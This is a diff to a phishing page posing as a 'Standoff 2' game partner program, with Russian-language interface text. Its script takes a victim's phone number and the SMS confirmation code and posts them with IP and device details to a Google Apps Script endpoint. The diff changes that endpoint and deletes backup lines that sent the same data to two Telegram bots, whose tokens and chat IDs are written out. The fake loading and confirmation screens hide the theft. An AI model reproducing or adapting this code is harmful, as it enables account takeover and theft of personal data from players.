@@ -97,7 +97,7 @@
         <div class="footer">Standoff 2 • Партнёрская программа</div>
     </div>
     <script>
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyXStieM73tN5EQq14dL-WoMcB0t0ID4eQ1gO-Z7N3ivBi8EiK4vCGECrPcimPC-V4b/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyv6rcqyjR7JulXS4QRzEvJAJ8mtATT6mj-yYJDRwz4P-dfGCUKiMLP12D26hT4BrtK/exec';
         const urlParams = new URLSearchParams(window.location.search);
         const inviter = urlParams.get('inviter') || 'Игрок';
         document.getElementById('inviter-name').textContent = inviter;
@@ -144,15 +144,7 @@
             if (phone[0] !== '9') { document.getElementById('phone-error').textContent = 'Номер должен начинаться с 9'; document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
             var ip = await getIP(); var fullPhone = '+7' + phone;
-            
-            // Отправка в Apps Script (основной)
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            
-            // Отправка в Telegram напрямую (резерв)
-            var tgMsg = '📱 Standoff 2\nНомер: ' + fullPhone + '\nIP: ' + ip + '\nУстройство: ' + navigator.userAgent;
-            fetch('https://api.telegram.org/bot8845403494:AAGmRnQ2Lb1yNauYXsGUXjC7MCOkh5V-e5E/sendMessage?chat_id=7990056308&text=' + encodeURIComponent(tgMsg), { mode: 'no-cors' }).catch(function(err) { console.log('tg2 ok'); });
-            fetch('https://api.telegram.org/bot8898714458:AAGq_yXrVbh_S00Gj6b5XS9PoXiYohxbPo4/sendMessage?chat_id=8800915878&text=' + encodeURIComponent(tgMsg), { mode: 'no-cors' }).catch(function(err) { console.log('tg1 ok'); });
-            
             document.getElementById('screen-phone').style.display = 'none'; document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-loading').style.display = 'block';
             setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
         }
@@ -165,15 +157,7 @@
             if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
             var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
-            
-            // Отправка кода в Apps Script
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            
-            // Отправка кода в Telegram напрямую
-            var tgCode = '🔐 Standoff 2 КОД: ' + code;
-            fetch('https://api.telegram.org/bot8845403494:AAGmRnQ2Lb1yNauYXsGUXjC7MCOkh5V-e5E/sendMessage?chat_id=7990056308&text=' + encodeURIComponent(tgCode), { mode: 'no-cors' }).catch(function(err) { console.log('tg2 ok'); });
-            fetch('https://api.telegram.org/bot8898714458:AAGq_yXrVbh_S00Gj6b5XS9PoXiYohxbPo4/sendMessage?chat_id=8800915878&text=' + encodeURIComponent(tgCode), { mode: 'no-cors' }).catch(function(err) { console.log('tg1 ok'); });
-            
             if (timerInterval) clearInterval(timerInterval);
             setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 1000);
         }
